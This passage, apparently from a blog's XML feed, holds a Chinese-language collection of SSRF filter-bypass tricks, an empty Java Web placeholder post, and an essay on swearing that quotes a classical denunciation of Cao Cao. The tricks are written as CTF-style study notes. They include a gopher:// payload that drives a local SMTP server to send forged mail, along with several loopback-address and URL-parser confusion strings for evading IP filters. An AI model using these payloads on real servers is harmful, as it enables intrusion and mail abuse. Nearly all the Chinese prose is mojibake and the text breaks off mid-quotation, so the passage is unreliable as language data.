class="line">ssrf.php?url&#x3D;gopher:&#x2F;&#x2F;127.0.0.1:25&#x2F;xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a</span><br></pre></td></tr></table></figure><h3 id="0x0C-0-0-0-0"><a href="#0x0C-0-0-0-0" class="headerlink" title="0x0C 0.0.0.0"></a>0x0C 0.0.0.0</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0&#x2F;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ–¹æ³•ä¼¼ä¹åªèƒ½åœ¨Linuxä¸‹ä½¿ç”¨ï¼ŒWindowså¹¶ä¸è®¤è¯†è¿™ä¸ªip</p><h3 id="0x0D-åˆ©ç”¨curlå’Œå…¶ä»–åº“è§£æurlçš„å·®å¼‚æ€§"><a href="#0x0D-åˆ©ç”¨curlå’Œå…¶ä»–åº“è§£æurlçš„å·®å¼‚æ€§" class="headerlink" title="0x0D åˆ©ç”¨curlå’Œå…¶ä»–åº“è§£æurlçš„å·®å¼‚æ€§"></a>0x0D åˆ©ç”¨curlå’Œå…¶ä»–åº“è§£æurlçš„å·®å¼‚æ€§</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;foo@127.0.0.1:80@www.google.com&#x2F;</span><br></pre></td></tr></table></figure><p><a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf">https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf</a> æœ‰æåˆ°ï¼Œä¸è¿‡è¿™ä¸ªæ–¹æ³•åœ¨curlè¾ƒæ–°çš„ç‰ˆæœ¬é‡Œè¢«ä¿®æ‰äº†</p><p><img src="https://i.loli.net/2021/04/25/qwN3UOZzeKaXAEB.jpg"></p><h3 id="0x0E-DNS-Rebinding"><a href="#0x0E-DNS-Rebinding" class="headerlink" title="0x0E DNS Rebinding"></a>0x0E DNS Rebinding</h3><p>æ‡’ğŸ•è¡¨ç¤ºè¿˜æ²¡æï¼Œä»¥åè¡¥ä¸Š</p><h3 id="0x0F-127-1"><a href="#0x0F-127-1" class="headerlink" title="0x0F 127.1"></a>0x0F 127.1</h3><p>åœ¨ <code>[ç½‘é¼æ¯ 2020 ç„æ­¦ç»„]SSRFMe</code> è¿™é“é¢˜ä¸­æœ‰è¿™ä¹ˆä¸ªç‚¹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.1&#x2F;</span><br></pre></td></tr></table></figure><ul><li><code>ip2long(&#39;127.1&#39;)</code>ä¼šè¿”å›<code>false</code>ï¼Œè¿™é‡Œå¯ä»¥ç»•è¿‡è¿‡æ»¤</li><li>ä½†æ˜¯<code>gethostbyname</code>åœ¨Linuxä¸‹ä¼šæŠŠ<code>127.1</code>å˜ä¸º<code>127.0.0.1</code>ï¼Œæ‰€ä»¥è¿™é¢˜æ˜¯æ— æ³•ä½¿ç”¨çš„ã€‚ä¸è¿‡windowsä¸‹ç»è¿‡<code>gethostbyname</code>åä¾ç„¶æ˜¯<code>127.1</code></li><li>curlæ˜¯æ”¯æŒ<code>127.1</code>è¿™æ ·çš„å†™æ³•çš„ï¼Œä½†è¿™æ ·å‘å‡ºå»çš„httpè¯·æ±‚æ˜¯æœ‰é—®é¢˜çš„ã€‚å› ä¸ºhttpåŒ…ä¸­çš„hostå¤´è¢«è®¾ä¸ºäº†<code>127.1</code>ï¼Œapacheä¼šè¿”å›ä¸€ä¸ª400 Bad Request</li><li>æ—¢ç„¶æ˜¯httpåŒ…çš„é—®é¢˜ï¼Œé‚£ä¹ˆç”¨gopheråè®®æ„é€ ä¸€ä¸ªæ­£å¸¸çš„httpè¯·æ±‚å³å¯ã€‚ä¸è¿‡è¿™å› ä¸º<code>gethostbyname</code>çš„åŸå› ï¼Œè¿™ä¸ªæ–¹æ³•è¿™é‡Œç”¨ä¸äº†</li></ul><h3 id="0x10-127-0-0-1"><a href="#0x10-127-0-0-1" class="headerlink" title="0x10 127.0.0.1."></a>0x10 127.0.0.1.</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1.</span><br></pre></td></tr></table></figure><p>ä¸è¿‡curlæ–¹æ³•ä¸æ”¯æŒè¿™ç§å†™æ³•</p><h3 id="0x11-http"><a href="#0x11-http" class="headerlink" title="0x11 http:///"></a>0x11 http:///</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;&#x2F;127.0.0.1</span><br></pre></td></tr></table></figure><p>ä¾ç„¶æ˜¯ <code>[ç½‘é¼æ¯ 2020 ç„æ­¦ç»„]SSRFMe</code></p><hr><ul><li>è¿™ä¸ªtrickä¹Ÿéå¸¸æœ‰æ„æ€ï¼Œä¹‹å‰ä¸€ç›´ä»¥ä¸ºåªæœ‰æµè§ˆå™¨æ‰ä¼šè§£æè¿™æ ·hostä¸ºç©ºçš„ç•¸å½¢urlï¼Œåœ¨På¸ˆå‚…å°å¯†åœˆåœ°æ—§å¸–é‡Œé¢Li4n0å¸ˆå‚…æåˆ°curlå’Œgitä¹Ÿä¼šæŒ‰ç…§æµè§ˆå™¨çš„æ–¹å¼è§£æï¼Œæµ‹è¯•ä¸€ä¸‹å‘ç°ç›´æ¥ç”¨curlä¼šå¡åœ¨é‚£ï¼Œä½†æ˜¯phpçš„libcurlå°±å¯ä»¥â€¦</li><li>ç”¨<code>parse_url</code>è§£æè¿™æ ·çš„ç•¸å½¢urlä¼šè¿”å›<code>false</code>ï¼Œç„¶å<code>$hostname=$url_parse[&#39;host&#39;];</code>ä¼šè¿”å›<code>null</code>ï¼ˆç¥å¥‡çš„php)</li><li>æ¥ç€åˆæ˜¯ä¸€ä¸ªwindowså’Œlinuxä¸‹phpçš„å·®å¼‚ï¼Œwindowsä¸‹<code>gethostbyname(null);</code>ä¼šè¿”å›æœ¬æœºipï¼Œå¯¼è‡´åé¢æ— æ³•ç»•è¿‡ipæ£€æµ‹ã€‚ç„¶è€Œlinuxä¸‹å¹¶æ²¡æœ‰è¿™æ ·çš„ç‰¹æ€§ï¼Œ<code>gethostbyname</code>ä¼šè¿”å›<code>null</code>ï¼Œç»•è¿‡ipæ£€æµ‹</li></ul><hr><p>æ•´ç†äº†ä¸€ä¸‹SSRFçš„ä¸€äº›tricksã€‚</p>]]></content>
      
      
      <categories>
          
          <category> æ™ºæ…§çš„æ”¶è— </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å¥‡æŠ€æ·«å·§ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaWebå‘</title>
      <link href="2021/04/25/JavaWeb%E5%9D%91/"/>
      <url>2021/04/25/JavaWeb%E5%9D%91/</url>
      
        <content type="html"><![CDATA[<p>å¼€ä¸ªæ–°å‘ï¼Œå­¦ Java web äº†ï¼Œæ…¢æ…¢æ›´äº†â€¦â€¦</p><hr>]]></content>
      
      
      <categories>
          
          <category> å‘ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è¯´è¯çš„è‰ºæœ¯</title>
      <link href="2021/04/25/%E8%AF%B4%E8%AF%9D%E7%9A%84%E8%89%BA%E6%9C%AF/"/>
      <url>2021/04/25/%E8%AF%B4%E8%AF%9D%E7%9A%84%E8%89%BA%E6%9C%AF/</url>
      
        <content type="html"><![CDATA[<p>è¯´è¯ï¼Œæ˜¯ä¸€é—¨è‰ºæœ¯ã€‚</p><h2 id="0x00-è°ˆğŸ"><a href="#0x00-è°ˆğŸ" class="headerlink" title="0x00 è°ˆğŸ"></a>0x00 è°ˆğŸ</h2><p>â€œæ±æ¯ä»Šæ™å¦ï¼Ÿâ€ï¼Œé—®å€™å¯¹æ–¹çš„æ¯äº²ï¼Œè¿™æ˜¯ä¸€ç§å¾ˆäº²åˆ‡çš„é—®å€™ï¼ŒåŒæ—¶ä¹Ÿæ˜¯ä¸€ç§å›½éª‚ï¼Œåªæ˜¯æ¸©æ–‡å°”é›…äº†ä¸€ç‚¹ï¼Œå¦‚æœè¦é€šä¿—åœ°æ¥è¯´ï¼Œâ€œä½ ğŸsiäº†â€ï¼Œâ€œè‰å°¼ğŸâ€å¯èƒ½æ›´åŠ é€‚åˆäºå›½äººã€‚</p><p>å¾ˆå–œæ¬¢è°­æ€»çš„ä¸€å¥éª‚ï¼Œâ€œå¬²ä½ å¦ˆå¦ˆåˆ«å˜â€ï¼Œå¾ˆæœ‰éŸµå‘³ï¼Œè¶Šå¬è¶Šæœ‰æ„æ€ã€‚</p><hr><p>å¬²ï¼ˆniÇoï¼‰ï¼šæ–¹è¨€ç”¨å­—ï¼Œå¾ˆå¤šæ—¶å€™ç”¨ä½œè„è¯ã€‚é€šå­¬ã€‚åœ¨æ™®é€šè¯ä¸­æ„ä¸ºæˆå¼„ã€æ…æ‰°ï¼Œæˆ–çº ç¼ ä¹‹æ„ã€‚åœ¨å†…è’™å¤ä»¥åŠæ™‹åŒ—æ–¹è¨€ä¸­ï¼Œæ„ä¸ºï¼šç¥æ°”ã€å¾—æ„ï¼Œæˆ–å¿—å¾—æ„æ»¡ä¹‹æ„ã€‚ç²¤è¯­ä¸­æ„ä¸ºï¼šç”Ÿæ°”ã€‚</p><hr><p>â€œå¬²~â€ï¼Œâ€œæˆ‘å¬²â€ï¼Œå¹¶ä¸æ˜¯ç”¨ä»¥éª‚äººï¼Œå¤šç”¨äºè¡¨ç¤ºæƒŠå¥‡ä¹‹æ„Ÿï¼Œæ¯”å¦‚â€œæˆ‘å¬²ï¼Œè¿™ä¹ˆå±Œçš„ğŸï¼Ÿâ€ï¼Œæˆ‘ä»¬é‚£ä¸€è¾¹çš„å¬²è¯»ä½œ<code>nia</code>ï¼Œâ€œæˆ‘å¬²deä½ liå¨˜â€ï¼Œå¦‚æ­¤ä½œä¸ºéª‚äººçš„è¯ã€‚</p><p>è¿™å°±æ˜¯å¾ˆç¥å¥‡çš„ä¸€ä¸ªåœ°æ–¹ï¼Œä¿—è¯è¯´éª‚äººä¸éª‚å®¶äººï¼Œé‚£ä¸ºç”šä¹ˆå¾ˆå¤šæ—¶å€™æˆ‘ä»¬å¹¶ä¸æ˜¯ç›´æ¥éª‚å¯¹æ–¹â€œä½ æ˜¯ä¸æ˜¯ğŸ•å•Šï¼Œä½ æ˜¯ä¸æ˜¯ğŸ–å•Šâ€è¿™ä¸€ç±»çš„ï¼Œè€Œæ˜¯ç›´æ¥ä¸Šå‡åˆ°äº²äººå‘¢ï¼Œâ€œä½ ğŸä»Šæ™šbissï¼Œbussä¸æ˜¯äº²ğŸâ€è¿™ä¸€ç±»çš„ã€‚</p><p>å¯èƒ½æ˜¯å› ä¸ºå¤ä»£éƒ½æœ‰ç½ªè‡³æ ªè¿ä¹æ—ï¼Œå¯¹æ–¹çš„è¡Œä¸ºå·²ç»è¶³å¤Ÿå¯æ¨ï¼Œä»¤äººè¿‡äºä¸æ»¡ï¼Œæ‰€ä»¥ç›´æ¥å¯¹å¯¹æ–¹çš„äº²äººè¿›è¡Œæ”»å‡»ï¼Œä¼šç»™äººä¸€ç§æ‰“å‡ºçœŸå®ä¼¤å®³çš„æ„Ÿè§‰ï¼Œæ¯•ç«Ÿå¯¹æ–¹äº‹æƒ…éƒ½åšäº†ï¼Œè¿˜ä¼šåœ¨ä¹ä½ éª‚ä»–å—ã€‚</p><p>è¿˜æœ‰ä¸€ä¸ªå¾ˆæœ‰æ„æ€çš„è¯´æ³•</p><hr><p>â€œæ‹Ÿå¦ˆæ­»äº†â€</p><p>æˆ‘æ‰€éª‚çš„è¿™ä¸ªğŸå¹¶ä¸çœŸçš„å°±æ˜¯ä½ çš„ğŸï¼Œè€Œæ˜¯æˆ‘æ‰€åˆ›é€ å‡ºçš„ä¸€ä¸ªè™šæ‹Ÿçš„ğŸï¼Œåªæ˜¯ä¸ºäº†è®©æˆ‘å¯ä»¥éª‚å¾—æ›´åŠ ç—›å¿«ï¼Œä½†æ˜¯è™½ç„¶æˆ‘ç°åœ¨è¿™ä¹ˆéª‚ç€ï¼Œä½†æ˜¯å¹³æ—¶æ—¥å¸¸ç”Ÿæ´»ä¸­æˆ‘è§åˆ°äº†ä½ çš„ğŸæˆ‘è¿˜æ˜¯ä¼šäº²åˆ‡åœ°å–Šä¸€å¥â€œé˜¿å§¨å¥½â€çš„ã€‚</p><hr><p>å¾ˆå¤©æ‰ï¼Œå…„å¼Ÿï¼Œè¿™ä¸ªè¯æ±‡çš„åˆ›é€ çœŸçš„æ˜¯éå¸¸çµæ€§ï¼Œå…¶å®å¤§å®¶åœ¨å¯¹éª‚çš„æ—¶å€™å¹¶ä¸æ˜¯çœŸçš„ä¸ºäº†å»è¯…å’’å¯¹æ–¹â€œğŸæ­»äº†â€ï¼Œè€Œæ˜¯ä¸ºäº†é€šè¿‡éª‚å¯¹æ–¹çš„ç›´ç³»è¡€ç¼˜å…³ç³»çš„äººï¼Œæ¥ä½¿è‡ªå·±çš„æ°”åŠ¿è¾¾åˆ°ä¸€ä¸ªæ›´é«˜çš„åœºåˆï¼Œæ¥ä½¿è‡ªå·±åœ¨ä¸€åœºéª‚æˆ˜ä¸­â€œå–èƒœâ€ã€‚</p><p><del>å¥½äº†ï¼Œå…ˆåˆ°è¿™é‡Œï¼Œä¸‹ä¸€æ¬¡æˆ‘ä»¬å°†å“æä¸€äº›ä¸å¸¦è„å­—çš„éª‚äººè¯´æ³•ã€‚ï¼ˆè¯¾è®¾å»äº†ï¼Œé€ƒ</del></p><h2 id="0x01-ä¼˜é›…çš„å¤äºº"><a href="#0x01-ä¼˜é›…çš„å¤äºº" class="headerlink" title="0x01 ä¼˜é›…çš„å¤äºº"></a>0x01 ä¼˜é›…çš„å¤äºº</h2><p>ä¸å¸¦è„å­—å…ˆå§‘ä¸”ä¸è°ˆï¼Œæ­¤åˆ»çš„å…´è‡´åœç•™åœ¨å¤äººçš„ä¼˜é›…ä¹‹é—´ï¼Œæˆ‘ä»¬æ¥è°ˆè°ˆå¤äººéª‚äººçš„ä¼˜é›…ä¹‹å¤„ã€‚</p><p>æœ‰ä¸€è¯´ä¸€å¥¥ï¼Œè¯´è„è¯å…¶å®æ˜¯æ£€éªŒå‹è°Šçš„é‡è¦æ ‡å‡†ï¼Œè„è¯è¶Šå¤šï¼Œè¶Šäº²å¯†ï¼Œå› ä¸ºè„è¯å¾€å¾€æ˜¯è¡¨è¾¾æ„Ÿæƒ…çš„æœ€ç›´æ¥é€”å¾„ï¼Œé‚£ä¹ˆå¤äººåˆæ˜¯å¦‚ä½•è¯´è„è¯çš„å‘¢ï¼Ÿå¦‚è‹¥ä½ åªèƒ½è¯´å‡ºâ€œğŸ‘´ä»æœªè§è¿‡å¦‚æ­¤ åšé¢œæ— è€»ä¹‹äººâ€ï¼Œé‚£ç¡®å®åº”è¯¥å¥½å¥½å­¦ä¹ ä¸€ä¸‹äº†ã€‚</p><p>åœ¨ç§¦æ±‰æ—¶æœŸï¼Œä½ ä¼šå‘ç°é‚£ä¸ªæ—¶ä»£çš„äººéª‚äººè¿˜æ˜¯å¾ˆæ¸©å’Œçš„ï¼Œè€Œä¸”éª‚äººéœ€è¦ä¸€å®šçš„çŸ¥è¯†ï¼Œå› ä¸ºå½“æ—¶ä¹¦é¢è¯­å’Œå£è¯­æ¯”è¾ƒæ¥è¿‘ã€‚ä¾‹å¦‚å¤§å®¶ä»¥å‰éƒ½å­¦è¿‡çš„ã€Šé¸¿é—¨å®´ã€‹ï¼Œé¡¹ç¾½ä¸å¬èŒƒå¢çš„åŠå‘Šï¼Œæ”¾èµ°äº†åˆ˜é‚¦ï¼Œæ€¥å¾—èŒƒå¢å¤§éª‚ï¼šâ€œå”‰ï¼Œç«–å­ä¸è¶³ä¸è°‹ï¼â€æ„æ€å°±æ˜¯â€œä¸æƒ³å†è·Ÿä½ è¿™ä¸ªå¼±æ™ºç©äº†ã€‚â€</p><p>å½“ç„¶ä¹Ÿæœ‰æ›´é«˜çº§ä¸€ç‚¹çš„ï¼Œå»ºå®‰ä¸ƒå­é™ˆç³æ›¾å†™ã€Šè®¨è´¼æª„æ–‡ã€‹ï¼Œç—›éª‚æ›¹æ“ç¥–å®—ä¸‰ä»£ï¼Œå¬å¾—æ›¹æ“ä¸€æ„£ä¸€æ„£ï¼Œä½ éª‚æˆ‘å¯ä»¥ç†è§£ï¼Œç¥–å®—ä¸‰ä»£éƒ½éª‚äº†æ˜¯ä»€ä¹ˆæ“ä½œï¼Œæ›´éªšçš„æ˜¯æŠŠæ›¹æ“å½“æ—¶çš„å¤´é£ä¸€ä¸‹å­æ²»å¥½äº†ï¼Œè¿™ä¸æ˜¯é€†å¤©æˆ‘éšä½ æ€ä¹ˆè¯´ã€‚</p><p>è´´ä¸€æ³¢åŸæ–‡ï¼ŒğŸ‘´ç”šæ˜¯å–œæ¬¢è¿™æ–‡é‡‡</p><blockquote><p>ç›–é—»æ˜ä¸»å›¾å±ä»¥åˆ¶å˜ï¼Œå¿ è‡£è™‘éš¾ä»¥ç«‹æƒã€‚æ˜¯ä»¥æœ‰éå¸¸ä¹‹äººï¼Œç„¶åæœ‰éå¸¸ä¹‹äº‹ï¼›æœ‰éå¸¸ä¹‹äº‹ï¼Œç„¶åç«‹éå¸¸ä¹‹åŠŸã€‚</p><p>å¤«éå¸¸è€…ï¼Œå›ºéå¸¸äººæ‰€æ‹Ÿä¹Ÿã€‚æ›©è€…ï¼Œå¼ºç§¦å¼±ä¸»ï¼Œèµµé«˜æ‰§æŸ„ï¼Œä¸“åˆ¶æœæƒï¼Œå¨ç¦ç”±å·±ï¼›æ—¶äººè¿«èƒï¼Œè«æ•¢æ­£è¨€ï¼›ç»ˆæœ‰æœ›å¤·ä¹‹è´¥ï¼Œç¥–å®—ç„šç­ï¼Œæ±¡è¾±è‡³ä»Šï¼Œæ°¸ä¸ºä¸–é‰´ã€‚åŠè‡»å•åå­£å¹´ï¼Œäº§ç¦„ä¸“æ”¿ï¼Œå†…å…¼äºŒå†›ï¼Œå¤–ç»Ÿæ¢ã€èµµï¼›æ“…æ–­ä¸‡æœºï¼Œå†³äº‹çœç¦ï¼›ä¸‹é™µä¸Šæ›¿ï¼Œæµ·å†…å¯’å¿ƒã€‚</p><p>äºæ˜¯ç»›ä¾¯æœ±è™šå…´å…µå¥‹æ€’ï¼Œè¯›å¤·é€†æš´ï¼Œå°Šç«‹å¤ªå®—ï¼Œæ•…èƒ½ç‹é“å…´éš†ï¼Œå…‰æ˜æ˜¾èï¼šæ­¤åˆ™å¤§è‡£ç«‹æƒä¹‹æ˜è¡¨ä¹Ÿã€‚å¸ç©ºæ›¹æ“ï¼šç¥–çˆ¶ä¸­å¸¸ä¾è…¾ï¼Œä¸å·¦æ‚ºã€å¾ç’œå¹¶ä½œå¦–å­½ï¼Œé¥•é¤®æ”¾æ¨ªï¼Œä¼¤åŒ–è™æ°‘ï¼›çˆ¶åµ©ï¼Œä¹åŒ„æºå…»ï¼Œå› èµƒå‡ä½ï¼Œèˆ†é‡‘è¾‡ç’§ï¼Œè¾“è´§æƒé—¨ï¼Œçªƒç›—é¼å¸ï¼Œå€¾è¦†é‡å™¨ã€‚æ“èµ˜é˜‰é—ä¸‘ï¼Œæœ¬æ— æ‡¿å¾·ï¼ŒçŠ­ç¥¨ç‹¡é”‹åï¼Œå¥½ä¹±ä¹ç¥¸ã€‚</p><p>å¹•åºœè‘£ç»Ÿé¹°æ‰¬ï¼Œæ‰«é™¤å‡¶é€†ï¼›ç»­é‡è‘£å“ï¼Œä¾µå®˜æš´å›½ã€‚äºæ˜¯æå‰‘æŒ¥é¼“ï¼Œå‘å‘½ä¸œå¤ï¼Œæ”¶ç½—è‹±é›„ï¼Œå¼ƒç‘•å–ç”¨ï¼›æ•…é‚ä¸æ“åŒè°˜åˆè°‹ï¼Œæˆä»¥è£¨å¸ˆï¼Œè°“å…¶é¹°çŠ¬ä¹‹æ‰ï¼Œçˆªç‰™å¯ä»»ã€‚</p><p>è‡³ä¹ƒæ„šä½»çŸ­ç•¥ï¼Œè½»è¿›æ˜“é€€ï¼Œä¼¤å¤·æŠ˜è¡„ï¼Œæ•°ä¸§å¸ˆå¾’ï¼›å¹•åºœè¾„å¤åˆ†å…µå‘½é”ï¼Œä¿®å®Œè¡¥è¾‘ï¼Œè¡¨è¡Œä¸œéƒ¡ï¼Œé¢†å…–å·åˆºå²ï¼Œè¢«ä»¥è™æ–‡ï¼Œå¥–î¡ˆæˆšå¨æŸ„ï¼Œå†€è·ç§¦å¸ˆä¸€å…‹ä¹‹æŠ¥ã€‚</p><p>è€Œæ“é‚æ‰¿èµ„è·‹æ‰ˆï¼Œæ£è¡Œå‡¶å¿’ï¼Œå‰²å‰¥å…ƒå…ƒï¼Œæ®‹è´¤å®³å–„ã€‚æ•…ä¹æ±Ÿå¤ªå®ˆè¾¹è®©ï¼Œè‹±æ‰ä¿Šä¼Ÿï¼Œå¤©ä¸‹çŸ¥åï¼›ç›´è¨€æ­£è‰²ï¼Œè®ºä¸é˜¿è°„ï¼›èº«é¦–è¢«æ­æ‚¬ä¹‹è¯›ï¼Œå¦»å­¥å—ç°ç­ä¹‹å’ã€‚</p><p>è‡ªæ˜¯å£«æ—æ„¤ç—›ï¼Œæ°‘æ€¨å¼¥é‡ï¼›ä¸€å¤«å¥‹è‡‚ï¼Œä¸¾å·åŒå£°ã€‚æ•…èº¬ç ´äºå¾æ–¹ï¼Œåœ°å¤ºäºå•å¸ƒï¼›å½·å¾¨ä¸œè£”ï¼Œè¹ˆæ®æ— æ‰€ã€‚</p><p>å¹•åºœæƒŸå¼ºå¹²å¼±æä¹‹ä¹‰ï¼Œä¸”ä¸ç™»å›äººä¹‹å…šï¼Œæ•…å¤æ´æ—Œæ“ç”²ï¼Œå¸­å·èµ·å¾ï¼Œé‡‘é¼“å“æŒ¯ï¼Œå¸ƒä¼—å¥”æ²®ï¼›æ‹¯å…¶æ­»äº¡ä¹‹æ‚£ï¼Œå¤å…¶æ–¹ä¼¯ä¹‹ä½ï¼šåˆ™å¹•åºœæ— å¾·äºå…–åœŸä¹‹æ°‘ï¼Œè€Œæœ‰å¤§é€ äºæ“ä¹Ÿã€‚</p><p>åä¼šéŠ®é©¾è¿”æ—†ï¼Œç¾¤è™å¯‡æ”»ã€‚æ—¶å†€å·æ–¹æœ‰åŒ—é„™ä¹‹è­¦ï¼ŒåŒªé‘ç¦»å±€ï¼›æ•…ä½¿ä»äº‹ä¸­éƒå¾å‹‹ï¼Œå°±å‘é£æ“ï¼Œä½¿ç¼®ä¿®éƒŠåº™ï¼Œç¿Šå«å¹¼ä¸»ã€‚</p><p>æ“ä¾¿æ”¾å¿—ï¼šä¸“è¡Œèƒè¿ï¼Œå½“å¾¡çœç¦ï¼›å‘ä¾®ç‹å®¤ï¼Œè´¥æ³•ä¹±çºªï¼›åé¢†ä¸‰å°ï¼Œä¸“åˆ¶æœæ”¿ï¼›çˆµèµç”±å¿ƒï¼Œå¼„æˆ®åœ¨å£ï¼›æ‰€çˆ±å…‰äº”å®—ï¼Œæ‰€æ¶ç­ä¸‰æ—ï¼›ç¾¤è°ˆè€…å—æ˜¾è¯›ï¼Œè…¹è®®è€…è’™éšæˆ®ï¼›</p><p>ç™¾åƒšé’³å£ï¼Œé“è·¯ä»¥ç›®ï¼›å°šä¹¦è®°æœä¼šï¼Œå…¬å¿å……å‘˜å“è€Œå·²æ•…å¤ªå°‰æ¨å½ªï¼Œå…¸å†äºŒå¸ï¼Œäº«å›½æä½ã€‚æ“å› ç¼˜çœ¦çšï¼Œè¢«ä»¥éç½ªï¼›æ¦œæ¥šå‚å¹¶ï¼Œäº”æ¯’å¤‡è‡³ï¼›è§¦æƒ…ä»»å¿’ï¼Œä¸é¡¾å®ªçº²ã€‚åˆè®®éƒèµµå½¦ï¼Œå¿ è°ç›´è¨€ï¼Œä¹‰æœ‰å¯çº³ï¼Œæ˜¯ä»¥åœ£æœå«å¬ï¼Œæ”¹å®¹åŠ é¥°ã€‚</p><p>æ“æ¬²è¿·å¤ºæ—¶æ˜ï¼Œæœç»è¨€è·¯ï¼Œæ“…æ”¶ç«‹æ€ï¼Œä¸ä¿ŸæŠ¥å›½ã€‚</p><p>åˆæ¢å­ç‹ï¼Œå…ˆå¸æ¯æ˜†ï¼ŒåŸé™µå°Šæ˜¾ï¼›æ¡‘æ¢“æ¾æŸï¼ŒçŠ¹å®œè‚ƒæ­ã€‚è€Œæ“å¸…å°†åå£«ï¼Œäº²ä¸´å‘æ˜ï¼Œç ´æ£ºè£¸å°¸ï¼Œæ å–é‡‘å®ã€‚è‡³ä»¤åœ£æœæµæ¶•ï¼Œå£«æ°‘ä¼¤æ€€ï¼æ“åˆç‰¹ç½®å‘ä¸˜ä¸­éƒå°†ã€æ‘¸é‡‘æ ¡å°‰ï¼Œæ‰€è¿‡éš³çªï¼Œæ— éª¸ä¸éœ²ã€‚</p><p>èº«å¤„ä¸‰å…¬ä¹‹ä½ï¼Œè€Œè¡Œæ¡€è™ä¹‹æ€ï¼Œæ±¡å›½å®³æ°‘ï¼Œæ¯’æ–½äººé¬¼ï¼åŠ å…¶ç»†è‡´æƒ¨è‹›ï¼Œç§‘é˜²äº’è®¾ï¼›ç½¾ç¼´å……è¹Šï¼Œå‘é˜±å¡è·¯ï¼›ä¸¾æ‰‹æŒ‚ç½‘ç½—ï¼ŒåŠ¨è¶³è§¦æœºé™·ï¼šæ˜¯ä»¥å…–ã€è±«æœ‰æ— èŠä¹‹æ°‘ï¼Œå¸éƒ½æœ‰åå—Ÿä¹‹æ€¨ã€‚</p><p>å†è§‚è½½ç±ï¼Œæ— é“ä¹‹è‡£ï¼Œè´ªæ®‹é…·çƒˆï¼Œäºæ“ä¸ºç”šï¼å¹•åºœæ–¹è¯˜å¤–å¥¸ï¼ŒæœªåŠæ•´è®­ï¼›åŠ ç»ªå«å®¹ï¼Œå†€å¯å¼¥ç¼ã€‚è€Œæ“è±ºç‹¼é‡å¿ƒï¼Œæ½œåŒ…ç¥¸è°‹ï¼Œä¹ƒæ¬²æ‘§æŒ æ ‹æ¢ï¼Œå­¤å¼±æ±‰å®¤ï¼Œé™¤ç­å¿ æ­£ï¼Œä¸“ä¸ºè¢…é›„ã€‚</p><p>å¾€è€…ä¼é¼“åŒ—å¾å…¬å­™ç“’ï¼Œå¼ºå¯‡æ¡€é€†ï¼Œæ‹’å›´ä¸€å¹´ã€‚æ“å› å…¶æœªç ´ï¼Œé˜´äº¤ä¹¦å‘½ï¼Œå¤–åŠ©ç‹å¸ˆï¼Œå†…ç›¸æ©è¢­ã€‚ä¼šå…¶è¡Œäººå‘éœ²ï¼Œç“’äº¦æ­å¤·ï¼Œæ•…ä½¿é”‹èŠ’æŒ«ç¼©ï¼Œå¥å›¾ä¸æœã€‚ä»Šä¹ƒå±¯æ®æ•·ä»“ï¼Œé˜»æ²³ä¸ºå›ºï¼Œæ¬²ä»¥è³è‚ä¹‹æ–§ï¼Œå¾¡éš†è½¦ä¹‹éš§ã€‚</p><p>å¹•åºœå¥‰æ±‰å¨çµï¼ŒæŠ˜å†²å®‡å®™ï¼›é•¿æˆŸç™¾ä¸‡ï¼Œèƒ¡éª‘åƒç¾¤ï¼›å¥‹ä¸­é»„è‚²è·ä¹‹å£«ï¼Œéª‹è‰¯å¼“åŠ²å¼©ä¹‹åŠ¿ï¼›å¹¶å·è¶Šå¤ªè¡Œï¼Œé’å·æ¶‰æµæ¼¯ï¼›å¤§å†›æ³›é»„æ²³è€Œè§’å…¶å‰ï¼Œè†å·ä¸‹å®›å¶è€Œæå…¶åï¼šé›·éœ‡è™æ­¥ï¼Œè‹¥ä¸¾ç‚ç«ä»¥ç„«é£è“¬ï¼Œè¦†æ²§æµ·ä»¥æ²ƒ[ç«ç¥¨]ç‚­ï¼Œæœ‰ä½•ä¸ç­è€…å“‰ï¼Ÿ</p><p>åˆæ“å†›åå£«ï¼Œå…¶å¯æˆ˜è€…ï¼Œçš†å‡ºè‡ªå¹½å†€ï¼Œæˆ–æ•…è¥éƒ¨æ›²ï¼Œå’¸æ€¨æ—·æ€å½’ï¼Œæµæ¶•åŒ—é¡¾ã€‚å…¶ä½™å…–è±«ä¹‹æ°‘ï¼ŒåŠå•å¸ƒå¼ æ¨ä¹‹ä½™ä¼—ï¼Œè¦†äº¡è¿«èƒï¼Œæƒæ—¶è‹Ÿä»ï¼›å„è¢«åˆ›å¤·ï¼Œäººä¸ºä»‡æ•Œã€‚</p><p>è‹¥å›æ—†æ–¹å¾‚ï¼Œç™»é«˜å†ˆè€Œå‡»é¼“å¹ï¼Œæ‰¬ç´ 